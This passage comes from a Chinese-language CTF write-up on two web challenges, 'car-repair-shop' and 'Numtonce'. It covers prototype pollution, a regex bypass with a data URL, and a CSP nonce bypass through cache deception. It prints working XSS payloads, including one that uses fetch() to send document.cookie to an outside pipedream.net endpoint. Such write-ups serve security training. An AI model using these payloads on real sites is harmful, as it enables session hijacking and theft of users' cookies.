title="我们不能创建或者改变这个方法对于通过jquery的扩展对于repair函数，仅仅改变属性，由于他是JSON。"></a>我们不能创建或者改变这个方法对于通过jquery的扩展对于<code>repair</code>函数，仅仅改变属性，由于他是JSON。</h6><h6 id="为了解决这个问题，我们可以使用一个有趣的javaScript数组属性和前面提到的原型链污染。当数组在javascript中转换为字符串时，他将成为由组成的元素的字符串表示形式。"><a href="#为了解决这个问题，我们可以使用一个有趣的javaScript数组属性和前面提到的原型链污染。当数组在javascript中转换为字符串时，他将成为由组成的元素的字符串表示形式。" class="headerlink" title="为了解决这个问题，我们可以使用一个有趣的javaScript数组属性和前面提到的原型链污染。当数组在javascript中转换为字符串时，他将成为由组成的元素的字符串表示形式。"></a>为了解决这个问题，我们可以使用一个有趣的javaScript数组属性和前面提到的原型链污染。当数组在javascript中转换为字符串时，他将成为由组成的元素的字符串表示形式。</h6><h6 id="因此-quot-lol-quot-变成-quot-lol-quot-。现在结合原型链的污染，可以轻松的通过下面的验证："><a href="#因此-quot-lol-quot-变成-quot-lol-quot-。现在结合原型链的污染，可以轻松的通过下面的验证：" class="headerlink" title="因此[&quot;lol&quot;]变成&quot;lol&quot;。现在结合原型链的污染，可以轻松的通过下面的验证："></a>因此[&quot;lol&quot;]变成&quot;lol&quot;。现在结合原型链的污染，可以轻松的通过下面的验证：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.md5(&#123;__proto__:[&quot;lol&quot;]&#125;) == &apos;9cdfb439c7876e703e307864c9167a15&apos;</span><br></pre></td></tr></table></figure>

<h5 id="但是在，payload中我们无法直接将原型设置为数组，否则我将失去Car类提供的功能。我们可以通过不直接将原型设置为数组，而是将原型设置为数组的对象来避免这种情况。"><a href="#但是在，payload中我们无法直接将原型设置为数组，否则我将失去Car类提供的功能。我们可以通过不直接将原型设置为数组，而是将原型设置为数组的对象来避免这种情况。" class="headerlink" title="但是在，payload中我们无法直接将原型设置为数组，否则我将失去Car类提供的功能。我们可以通过不直接将原型设置为数组，而是将原型设置为数组的对象来避免这种情况。"></a>但是在，payload中我们无法直接将原型设置为数组，否则我将失去<code>Car</code>类提供的功能。我们可以通过不直接将原型设置为数组，而是将原型设置为数组的对象来避免这种情况。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;: &#123;&quot;__proto__&quot;: [&quot;lol&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="现在，新的payload如下："><a href="#现在，新的payload如下：" class="headerlink" title="现在，新的payload如下："></a>现在，新的payload如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20&#123;%22__proto__%22:%20[%22lol%22]&#125;&#125;#BugattiPorsche</span><br></pre></td></tr></table></figure>

<h5 id="为什么上面的payload能够处理成功，你可以自己体验一波。"><a href="#为什么上面的payload能够处理成功，你可以自己体验一波。" class="headerlink" title="为什么上面的payload能够处理成功，你可以自己体验一波。"></a>为什么上面的payload能够处理成功，你可以自己体验一波。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const json=&#123;&quot;__proto__&quot;: &#123;&quot;__proto__&quot;: [&quot;lol&quot;]&#125;&#125;;</span><br><span class="line">    const str=unescape(encodeURIComponent(json));</span><br><span class="line">    console.log(str);</span><br><span class="line">    console.log($.md5(&#123;&quot;__proto__&quot;: &#123;&quot;__proto__&quot;: [&quot;lol&quot;]&#125;&#125;) === &apos;9cdfb439c7876e703e307864c9167a15&apos;);</span><br></pre></td></tr></table></figure>

<h5 id="使用这个payload我们绕过了MD5的检查，接下来处理到了repairWithHelper函数。"><a href="#使用这个payload我们绕过了MD5的检查，接下来处理到了repairWithHelper函数。" class="headerlink" title="使用这个payload我们绕过了MD5的检查，接下来处理到了repairWithHelper函数。"></a>使用这个payload我们绕过了MD5的检查，接下来处理到了<code>repairWithHelper</code>函数。</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="在这个函数中我们看到它创建了一个script标签并且设置它的src属性为url提供作为参数传入函数的。"><a href="#在这个函数中我们看到它创建了一个script标签并且设置它的src属性为url提供作为参数传入函数的。" class="headerlink" title="在这个函数中我们看到它创建了一个script标签并且设置它的src属性为url提供作为参数传入函数的。"></a>在这个函数中我们看到它创建了一个script标签并且设置它的<code>src</code>属性为url提供作为参数传入函数的。</h5><h5 id="使用help参数来控制传入上面函数的参数。"><a href="#使用help参数来控制传入上面函数的参数。" class="headerlink" title="使用help参数来控制传入上面函数的参数。"></a>使用<code>help</code>参数来控制传入上面函数的参数。</h5><h5 id="接下来我们要面临的是正则表达式，他看起来非常严格。"><a href="#接下来我们要面临的是正则表达式，他看起来非常严格。" class="headerlink" title="接下来我们要面临的是正则表达式，他看起来非常严格。"></a>接下来我们要面临的是正则表达式，他看起来非常严格。</h5><h5 id="URL的最后一部分-文件名-只能使用任意的字符。"><a href="#URL的最后一部分-文件名-只能使用任意的字符。" class="headerlink" title="URL的最后一部分(文件名)只能使用任意的字符。"></a>URL的最后一部分(文件名)只能使用任意的字符。</h5><h5 id="经过一些测试，我发现data-URL将与regex匹配data-lt-MIME-Type-gt-charset-lt-Charset-gt-base64-lt-Data-gt"><a href="#经过一些测试，我发现data-URL将与regex匹配data-lt-MIME-Type-gt-charset-lt-Charset-gt-base64-lt-Data-gt" class="headerlink" title="经过一些测试，我发现data-URL将与regex匹配data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;"></a>经过一些测试，我发现data-URL将与regex匹配<code>data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;</code></h5><h5 id="如果它会加载某种垃圾内容类型，则只有不确定性，因为所需的-fluxfingers-net主机名将被放置。"><a href="#如果它会加载某种垃圾内容类型，则只有不确定性，因为所需的-fluxfingers-net主机名将被放置。" class="headerlink" title="如果它会加载某种垃圾内容类型，则只有不确定性，因为所需的*.fluxfingers.net主机名将被放置。"></a>如果它会加载某种垃圾内容类型，则只有不确定性，因为所需的<code>*.fluxfingers.net</code>主机名将被放置。</h5><h5 id="令人惊讶的是他执行了，并且弹出了一个alert-并且help设置如下："><a href="#令人惊讶的是他执行了，并且弹出了一个alert-并且help设置如下：" class="headerlink" title="令人惊讶的是他执行了，并且弹出了一个alert()并且help设置如下："></a>令人惊讶的是他执行了，并且弹出了一个<code>alert()</code>并且<code>help</code>设置如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,alert(1)//.js</span><br></pre></td></tr></table></figure>

<h5 id="更新的payload"><a href="#更新的payload" class="headerlink" title="更新的payload:"></a>更新的payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20&#123;%22__proto__%22:%20[%22lol%22],%20%22dotAll%22:true&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,alert(1)//.js#BugattiPorsche</span><br></pre></td></tr></table></figure>

<h5 id="现在我们有了完整的利用链。唯一缺少的部分就是读取flag"><a href="#现在我们有了完整的利用链。唯一缺少的部分就是读取flag" class="headerlink" title="现在我们有了完整的利用链。唯一缺少的部分就是读取flag"></a>现在我们有了完整的利用链。唯一缺少的部分就是读取flag</h5><h5 id="解决"><a href="#解决" class="headerlink" title="解决:"></a>解决:</h5><h6 id="最终的payload，成功读取到flag，如下图："><a href="#最终的payload，成功读取到flag，如下图：" class="headerlink" title="最终的payload，成功读取到flag，如下图："></a>最终的payload，成功读取到flag，如下图：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20&#123;%22__proto__%22:%20[%22lol%22],%20%22dotAll%22:true&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,fetch(%22https://en7f8h9cynsmk.x.pipedream.net/%22%2Bdocument.cookie)//.js#BugattiPorsche</span><br></pre></td></tr></table></figure>

<h5 id="它提取cookie并将其作为URL的一部分发送fetch给我们控制的HTTP端点。RequestBin-com和类似的网站对此非常有用。在这里，我们可以检查请求，并查看有效负载URL的访问者将发送什么。"><a href="#它提取cookie并将其作为URL的一部分发送fetch给我们控制的HTTP端点。RequestBin-com和类似的网站对此非常有用。在这里，我们可以检查请求，并查看有效负载URL的访问者将发送什么。" class="headerlink" title="它提取cookie并将其作为URL的一部分发送fetch给我们控制的HTTP端点。RequestBin.com和类似的网站对此非常有用。在这里，我们可以检查请求，并查看有效负载URL的访问者将发送什么。"></a>它提取cookie并将其作为URL的一部分发送fetch给我们控制的HTTP端点。RequestBin.com和类似的网站对此非常有用。在这里，我们可以检查请求，并查看有效负载URL的访问者将发送什么。</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/flag-requestbin.png" alt></p>
<h5 id="最后我们得到了正确的flag：-flag-brumm-brumm-brumm-brumm-brumm-brumm-brumm"><a href="#最后我们得到了正确的flag：-flag-brumm-brumm-brumm-brumm-brumm-brumm-brumm" class="headerlink" title="最后我们得到了正确的flag： flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}"></a>最后我们得到了正确的flag： flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}</h5><h4 id="Numtonce"><a href="#Numtonce" class="headerlink" title="Numtonce"></a>Numtonce</h4><h5 id="题目的地址-https-fluxfingersforfuture-fluxfingers-net-challenges-29"><a href="#题目的地址-https-fluxfingersforfuture-fluxfingers-net-challenges-29" class="headerlink" title="题目的地址:https://fluxfingersforfuture.fluxfingers.net/challenges/29"></a>题目的地址:<a href="https://fluxfingersforfuture.fluxfingers.net/challenges/29" target="_blank" rel="noopener">https://fluxfingersforfuture.fluxfingers.net/challenges/29</a></h5><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><h6 id="面对世界上所有的坏消息，每个人都需要一个安静的地方来放松心情。"><a href="#面对世界上所有的坏消息，每个人都需要一个安静的地方来放松心情。" class="headerlink" title="面对世界上所有的坏消息，每个人都需要一个安静的地方来放松心情。"></a>面对世界上所有的坏消息，每个人都需要一个安静的地方来放松心情。</h6><h6 id="我们建立了一个-但是你必须来帮助我们保证它安全。如果你发现一个危险，告诉这个森林守护者，它将把cookie发送给你。"><a href="#我们建立了一个-但是你必须来帮助我们保证它安全。如果你发现一个危险，告诉这个森林守护者，它将把cookie发送给你。" class="headerlink" title="我们建立了一个,但是你必须来帮助我们保证它安全。如果你发现一个危险，告诉这个森林守护者，它将把cookie发送给你。"></a><a href="https://numtonce.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">我们建立了一个</a>,但是你必须来帮助我们保证它安全。如果你发现一个危险，<a href="https://numtonce.fluxfingersforfuture.fluxfingers.net/submit/" target="_blank" rel="noopener">告诉这个森林守护者</a>，它将把cookie发送给你。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/website.png" alt></p>
<h5 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h5><h6 id="可以通过URL哈希实现XSS。但是已经设置CSP，因此不允许使用外部脚本。"><a href="#可以通过URL哈希实现XSS。但是已经设置CSP，因此不允许使用外部脚本。" class="headerlink" title="可以通过URL哈希实现XSS。但是已经设置CSP，因此不允许使用外部脚本。"></a>可以通过URL哈希实现XSS。但是已经设置CSP，因此不允许使用外部脚本。</h6><h6 id="除非随机数-nonce-标签是正确的。想法是通过从缓存中加载网站来强制刷新后使nonce标签来保持相同。"><a href="#除非随机数-nonce-标签是正确的。想法是通过从缓存中加载网站来强制刷新后使nonce标签来保持相同。" class="headerlink" title="除非随机数(nonce)标签是正确的。想法是通过从缓存中加载网站来强制刷新后使nonce标签来保持相同。"></a>除非随机数(nonce)标签是正确的。想法是通过从缓存中加载网站来强制刷新后使nonce标签来保持相同。</h6><h6 id="js-css-image文件是从缓存中加载的，但是这个index-php文件不是。"><a href="#js-css-image文件是从缓存中加载的，但是这个index-php文件不是。" class="headerlink" title="js/css/image文件是从缓存中加载的，但是这个index.php文件不是。"></a>js/css/image文件是从缓存中加载的，但是这个index.php文件不是。</h6><h6 id="但是我们可以在url的后面附加一个css文件来从缓存中强制加载index-php文件"><a href="#但是我们可以在url的后面附加一个css文件来从缓存中强制加载index-php文件" class="headerlink" title="但是我们可以在url的后面附加一个css文件来从缓存中强制加载index.php文件"></a>但是我们可以在<code>url</code>的后面附加一个<code>css</code>文件来从缓存中强制加载<code>index.php</code>文件</h6><h6 id="例如下面的链接http-url-com-index-php-blub-css。"><a href="#例如下面的链接http-url-com-index-php-blub-css。" class="headerlink" title="例如下面的链接http://url.com/index.php/blub.css。"></a>例如下面的链接<a href="http://url.com/index.php/blub.css" target="_blank" rel="noopener">http://url.com/index.php/blub.css</a>。</h6><h6 id="index-php将会加载，然后这个代理服务器将他作为一个css文件并且加载index-php文件的缓存版本。"><a href="#index-php将会加载，然后这个代理服务器将他作为一个css文件并且加载index-php文件的缓存版本。" class="headerlink" title="index.php将会加载，然后这个代理服务器将他作为一个css文件并且加载index.php文件的缓存版本。"></a><code>index.php</code>将会加载，然后这个代理服务器将他作为一个css文件并且加载<code>index.php</code>文件的缓存版本。</h6><h6 id="因此现在我们提前知道了随机数-nonce-，现在我们可以执行我们的自定义js代码。"><a href="#因此现在我们提前知道了随机数-nonce-，现在我们可以执行我们的自定义js代码。" class="headerlink" title="因此现在我们提前知道了随机数(nonce)，现在我们可以执行我们的自定义js代码。"></a>因此现在我们提前知道了随机数(nonce)，现在我们可以执行我们的自定义<code>js</code>代码。</h6><h5 id="完善payload："><a href="#完善payload：" class="headerlink" title="完善payload："></a>完善payload：</h5><h6 id="通过阅读上面的描述，我们的目标似乎是去盗窃这个cookie从浏览器。"><a href="#通过阅读上面的描述，我们的目标似乎是去盗窃这个cookie从浏览器。" class="headerlink" title="通过阅读上面的描述，我们的目标似乎是去盗窃这个cookie从浏览器。"></a>通过阅读上面的描述，我们的目标似乎是去盗窃这个cookie从浏览器。</h6><h6 id="通常，这是通过将自定义的javascript代码注入网站-xss-并且通过一段代码将Cookie发送到攻击者控制的服务器来完成的。"><a href="#通常，这是通过将自定义的javascript代码注入网站-xss-并且通过一段代码将Cookie发送到攻击者控制的服务器来完成的。" class="headerlink" title="通常，这是通过将自定义的javascript代码注入网站(xss)并且通过一段代码将Cookie发送到攻击者控制的服务器来完成的。"></a>通常，这是通过将自定义的javascript代码注入网站(xss)并且通过一段代码将Cookie发送到攻击者控制的服务器来完成的。</h6><h6 id="森林守护者网站也仅仅是一个文本字段，用于代替URL。"><a href="#森林守护者网站也仅仅是一个文本字段，用于代替URL。" class="headerlink" title="森林守护者网站也仅仅是一个文本字段，用于代替URL。"></a>森林守护者网站也仅仅是一个文本字段，用于代替URL。</h6><h6 id="然后xss-bot将会带着cookie访问这些URL，而那个flag就在cookie里面。"><a href="#然后xss-bot将会带着cookie访问这些URL，而那个flag就在cookie里面。" class="headerlink" title="然后xss bot将会带着cookie访问这些URL，而那个flag就在cookie里面。"></a>然后xss bot将会带着cookie访问这些URL，而那个flag就在cookie里面。</h6><h6 id="现在我们开始构造poc去攻击。"><a href="#现在我们开始构造poc去攻击。" class="headerlink" title="现在我们开始构造poc去攻击。"></a>现在我们开始构造poc去攻击。</h6><h6 id="1-伪造一个可以触发自定义javascript的URL，以将Cookie发送到我们控制的服务器。"><a href="#1-伪造一个可以触发自定义javascript的URL，以将Cookie发送到我们控制的服务器。" class="headerlink" title="1. 伪造一个可以触发自定义javascript的URL，以将Cookie发送到我们控制的服务器。"></a>1. 伪造一个可以触发自定义javascript的URL，以将Cookie发送到我们控制的服务器。</h6><h6 id="2-将该URL提交给我们的森林bot。"><a href="#2-将该URL提交给我们的森林bot。" class="headerlink" title="2. 将该URL提交给我们的森林bot。"></a>2. 将该URL提交给我们的森林bot。</h6><h6 id="3-查看我们的服务器日志获取窃取的cookie。"><a href="#3-查看我们的服务器日志获取窃取的cookie。" class="headerlink" title="3. 查看我们的服务器日志获取窃取的cookie。"></a>3. 查看我们的服务器日志获取窃取的cookie。</h6><h6 id="4-拿到cookie中的flag。"><a href="#4-拿到cookie中的flag。" class="headerlink" title="4. 拿到cookie中的flag。"></a>4. 拿到cookie中的flag。</h6><h5 id="从这个网站本身来看，这似乎非常简单。因为他只有一页，并且源代码几乎只有下面的javascript代码。"><a href="#从这个网站本身来看，这似乎非常简单。因为他只有一页，并且源代码几乎只有下面的javascript代码。" class="headerlink" title="从这个网站本身来看，这似乎非常简单。因为他只有一页，并且源代码几乎只有下面的javascript代码。"></a>从这个网站本身来看，这似乎非常简单。因为他只有一页，并且源代码几乎只有下面的javascript代码。</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">"b80a92df721eda620876363536b7e9a6"</span> src=<span class="string">"/emojify.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">const</span> l=location</span><br><span class="line">      <span class="keyword">let</span> h=l.hash</span><br><span class="line">      <span class="keyword">var</span> p=l.hostname</span><br><span class="line">    <span class="keyword">const</span> s=l.search</span><br><span class="line">      <span class="keyword">let</span> a=h.split(p)</span><br><span class="line">      <span class="keyword">var</span> b=a.map(<span class="function">(<span class="params">o,O</span>)=&gt;</span>(O^<span class="number">0</span>!==<span class="number">0</span>&amp;&amp;o||<span class="string">''</span>)).map(<span class="built_in">decodeURIComponent</span>)</span><br><span class="line">    <span class="keyword">const</span> o0o=b.join(s)</span><br><span class="line">      <span class="keyword">let</span> script=sessionStorage[a[<span class="number">0</span>]]</span><br><span class="line">      <span class="keyword">var</span> my=<span class="function"><span class="params">a</span>=&gt;</span>b</span><br><span class="line">    <span class="keyword">const</span> msg=<span class="string">'there is p'</span> <span class="keyword">in</span> my <span class="string">`t'</span></span><br><span class="line"><span class="string">˂/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">    o0o='nope'</span></span><br><span class="line"><span class="string">˂/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A wise man once said: 'A CSP a day keeps the XSS away.`</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;div id="garden"&gt;'</span>);</span><br><span class="line">    <span class="built_in">document</span>.write(o0o||<span class="string">'tt t t t fnttttttttt nfst t ttt n t tl t  tnr tmtt dt n  cttttrttntt t tttttnttt   t t nt   tt tt nt  t  t  t'</span>.split(<span class="string">''</span>).map(<span class="function"><span class="params">c</span>=&gt;</span>(&#123;<span class="attr">t</span>:<span class="string">':evergreen_tree:'</span>,<span class="attr">f</span>:<span class="string">':fallen_leaf:'</span>,<span class="attr">s</span>:<span class="string">':squirrel:'</span>,<span class="attr">l</span>:<span class="string">':leaves:'</span>,<span class="attr">r</span>:<span class="string">':rabbit:'</span>,<span class="attr">m</span>:<span class="string">':maple_leaf:'</span>,<span class="attr">d</span>:<span class="string">':droplet:'</span>,<span class="attr">c</span>:<span class="string">':cherry_blossom:'</span>,<span class="attr">n</span>:<span class="string">'&lt;br/&gt;'</span>,<span class="string">' '</span>:<span class="string">':white_small_square:'</span>&#125;[c])).join(<span class="string">''</span>));</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;/div&gt;'</span>);</span><br><span class="line"></span><br><span class="line">    emojify.setConfig(&#123; <span class="attr">img_dir</span>: <span class="string">'/emojis'</span> &#125;);</span><br><span class="line">    emojify.run(garden);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="阅读这个代码，可以看到由于这个document-write-o0o-可能在URL上进行XSS。"><a href="#阅读这个代码，可以看到由于这个document-write-o0o-可能在URL上进行XSS。" class="headerlink" title="阅读这个代码，可以看到由于这个document.write(o0o),可能在URL上进行XSS。"></a>阅读这个代码，可以看到由于这个<code>document.write(o0o)</code>,可能在URL上进行XSS。</h6><h6 id="回顾这个o0o可以看到这个是由-号后面的组件生成的，那么我们可以用下面的url进行注入。"><a href="#回顾这个o0o可以看到这个是由-号后面的组件生成的，那么我们可以用下面的url进行注入。" class="headerlink" title="回顾这个o0o可以看到这个是由#号后面的组件生成的，那么我们可以用下面的url进行注入。"></a>回顾这个<code>o0o</code>可以看到这个是由#号后面的组件生成的，那么我们可以用下面的url进行注入。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/#numtonce.fluxfingersforfuture.fluxfingers.net&lt;h1&gt;test&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<h6 id="下一步是去尝试嵌入我们的javascript代码。但是有CSP的保护。"><a href="#下一步是去尝试嵌入我们的javascript代码。但是有CSP的保护。" class="headerlink" title="下一步是去尝试嵌入我们的javascript代码。但是有CSP的保护。"></a>下一步是去尝试嵌入我们的javascript代码。但是有CSP的保护。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/csp.png" alt></p>
<h6 id="将CSP标头设置为不允许脚本执行，除非nonce标签或者script的sha256是正确的："><a href="#将CSP标头设置为不允许脚本执行，除非nonce标签或者script的sha256是正确的：" class="headerlink" title="将CSP标头设置为不允许脚本执行，除非nonce标签或者script的sha256是正确的："></a>将CSP标头设置为不允许脚本执行，除非nonce标签或者script的sha256是正确的：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=&apos; &apos;nonce-117bc8c1d6ead80e5b6ad3f3eca4921e&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;; base-uri &apos;none&apos;; frame-ancestors &apos;none&apos;; form-action &apos;none&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="nonce是一个随机的令牌，只要网站重新加载那么他就会重新生成。"><a href="#nonce是一个随机的令牌，只要网站重新加载那么他就会重新生成。" class="headerlink" title="nonce是一个随机的令牌，只要网站重新加载那么他就会重新生成。"></a>nonce是一个随机的令牌，只要网站重新加载那么他就会重新生成。</h6><h6 id="这两个选项对我们来说都是不太可能的-https-csp-evaluator-withgoogle-com-，因此我们开始尝试去理解剩下的代码。"><a href="#这两个选项对我们来说都是不太可能的-https-csp-evaluator-withgoogle-com-，因此我们开始尝试去理解剩下的代码。" class="headerlink" title="这两个选项对我们来说都是不太可能的(https://csp-evaluator.withgoogle.com/)，因此我们开始尝试去理解剩下的代码。"></a>这两个选项对我们来说都是不太可能的(<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a>)，因此我们开始尝试去理解剩下的代码。</h6><h6 id="一段时间后js-css-image文件的响应头有点奇怪。"><a href="#一段时间后js-css-image文件的响应头有点奇怪。" class="headerlink" title="一段时间后js/css/image文件的响应头有点奇怪。"></a>一段时间后js/css/image文件的响应头有点奇怪。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hit-Or-Miss: i guess they never miss huh?</span><br></pre></td></tr></table></figure>

<h6 id="这是当我们注意到js-css-images文件是从缓存中加载的。他们还有一个Age标头该标头在10分钟后过期。"><a href="#这是当我们注意到js-css-images文件是从缓存中加载的。他们还有一个Age标头该标头在10分钟后过期。" class="headerlink" title="这是当我们注意到js/css/images文件是从缓存中加载的。他们还有一个Age标头该标头在10分钟后过期。"></a>这是当我们注意到js/css/images文件是从缓存中加载的。他们还有一个Age标头该标头在10分钟后过期。</h6><h6 id="这个想法突然出现，如果我们设法从缓存中加载index-php，那么令牌将在10分钟是有效的。"><a href="#这个想法突然出现，如果我们设法从缓存中加载index-php，那么令牌将在10分钟是有效的。" class="headerlink" title="这个想法突然出现，如果我们设法从缓存中加载index.php，那么令牌将在10分钟是有效的。"></a>这个想法突然出现，如果我们设法从缓存中加载<code>index.php</code>，那么令牌将在10分钟是有效的。</h6><h6 id="我们尝试去加载这个index-php文件通过设置一些特殊的标头-Cache-Control等等-。"><a href="#我们尝试去加载这个index-php文件通过设置一些特殊的标头-Cache-Control等等-。" class="headerlink" title="我们尝试去加载这个index.php文件通过设置一些特殊的标头(Cache-Control等等)。"></a>我们尝试去加载这个index.php文件通过设置一些特殊的标头(Cache-Control等等)。</h6><h6 id="但是都是没有用的，并且xss-bot也没有设置它们。"><a href="#但是都是没有用的，并且xss-bot也没有设置它们。" class="headerlink" title="但是都是没有用的，并且xss bot也没有设置它们。"></a>但是都是没有用的，并且xss bot也没有设置它们。</h6><h6 id="与另一个头文件一样Server-nginx，我们查询了如何在nginx上设置基本缓存。基本上，将正则表达式过滤器应用于网址，如果匹配，文件将被缓存。"><a href="#与另一个头文件一样Server-nginx，我们查询了如何在nginx上设置基本缓存。基本上，将正则表达式过滤器应用于网址，如果匹配，文件将被缓存。" class="headerlink" title="与另一个头文件一样Server: nginx，我们查询了如何在nginx上设置基本缓存。基本上，将正则表达式过滤器应用于网址，如果匹配，文件将被缓存。"></a>与另一个头文件一样<code>Server: nginx</code>，我们查询了如何在nginx上设置基本缓存。基本上，将正则表达式过滤器应用于网址，如果匹配，文件将被缓存。</h6><h6 id="因此，我们尝试伪造以-css结尾但仍加载index-php的URL。经过反复试验，我们伪造了以下网址："><a href="#因此，我们尝试伪造以-css结尾但仍加载index-php的URL。经过反复试验，我们伪造了以下网址：" class="headerlink" title="因此，我们尝试伪造以.css结尾但仍加载index.php的URL。经过反复试验，我们伪造了以下网址："></a>因此，我们尝试伪造以.css结尾但仍加载index.php的URL。经过反复试验，我们伪造了以下网址：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css</span><br></pre></td></tr></table></figure>

<h6 id="成功！nonce-token始终相同，并且响应具有所有缓存标头！"><a href="#成功！nonce-token始终相同，并且响应具有所有缓存标头！" class="headerlink" title="成功！nonce token始终相同，并且响应具有所有缓存标头！"></a>成功！nonce token始终相同，并且响应具有所有缓存标头！</h6><h6 id="尝试以下操作，我们将用xss弹出一个alert-1-nonce-是先前响应头中的CSP-nonce令牌-："><a href="#尝试以下操作，我们将用xss弹出一个alert-1-nonce-是先前响应头中的CSP-nonce令牌-：" class="headerlink" title="尝试以下操作，我们将用xss弹出一个alert(1)({nonce}是先前响应头中的CSP nonce令牌)："></a>尝试以下操作，我们将用xss弹出一个alert(1)({nonce}是先前响应头中的CSP nonce令牌)：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net&lt;script nonce=&quot;&#123;nonce&#125;&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

